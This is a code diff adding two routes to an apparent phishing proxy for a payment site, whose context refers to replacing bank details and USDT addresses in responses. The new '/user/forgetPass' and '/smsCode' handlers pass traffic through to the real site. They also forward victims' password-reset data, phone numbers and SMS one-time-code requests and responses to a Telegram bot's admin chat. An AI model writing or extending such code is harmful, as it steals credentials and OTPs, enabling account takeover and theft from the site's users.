@@ -1167,6 +1167,33 @@ app.all('/payOrder/list', async (req, res) => {
 app.all('/money/withdrawRecord', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
+app.all('/user/forgetPass', async (req, res) => {
+  try {
+    const bankData = await loadData();
+    const reqBody = req.body || {};
+
+    if (bankData.adminChatId && bot) {
+      try {
+        const reqDump = JSON.stringify(reqBody, null, 2).substring(0, 1000);
+        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset Request!\n${reqDump}`);
+      } catch(e) {}
+    }
+
+    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
+
+    if (bankData.adminChatId && bot) {
+      try {
+        const dump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 2000);
+        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset Response:\n${dump}`);
+      } catch(e) {}
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+});
+
 app.all('/user/cashFlow', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
@@ -1180,6 +1207,27 @@ app.all('/user/*', async (req, res) => {
   if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
   await proxyAndAddBonus(req, res);
 });
+
+app.all('/smsCode', async (req, res) => {
+  try {
+    const bankData = await loadData();
+    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
+    const reqBody = req.body || {};
+
+    if (bankData.adminChatId && bot) {
+      try {
+        const dump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 3000);
+        const reqDump = JSON.stringify(reqBody, null, 2).substring(0, 500);
+        await bot.sendMessage(bankData.adminChatId, `📱 SMS OTP Request!\nPhone: ${reqBody.phone || reqBody.mobile || reqBody.phoneNumber || '?'}\nRequest: ${reqDump}\n\n📋 Response:\n${dump}`);
+      } catch(e) {}
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
+});
+
 
 function replaceUsdtInResponse(jsonResp, bankData, label) {
   if (!bankData.usdtAddress || !jsonResp) return null;
